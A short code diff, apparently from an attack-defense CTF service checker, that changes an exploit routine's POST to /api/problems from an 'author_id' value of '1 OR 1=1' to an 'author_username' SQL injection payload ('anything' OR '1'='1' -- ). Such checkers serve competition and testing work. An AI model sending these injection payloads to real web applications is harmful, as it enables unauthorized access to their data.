@@ -295,7 +295,7 @@ async def exploit_drafts(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
 
     response = await conn.client.post(
         "/api/problems",
-        data={"author_id": "1 OR 1=1"}
+        data={"author_username": "anything' OR '1'='1' -- "}
     )
     
     if response.status_code not in [200, 201, 302]:
